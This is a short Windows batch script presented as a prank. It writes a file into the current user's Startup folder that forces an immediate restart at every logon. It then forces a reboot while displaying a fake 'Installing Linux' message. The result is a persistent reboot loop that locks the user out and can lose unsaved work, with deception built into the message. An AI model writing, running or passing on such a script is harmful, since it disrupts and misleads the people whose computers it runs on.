cd /d "%systemdrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo @echo off > pranked.bat
echo shutdown /r /f /t 0 >>pranked.bat
shutdown /r /f /c "Installing Linux... System may reboot a couple times" /t 10
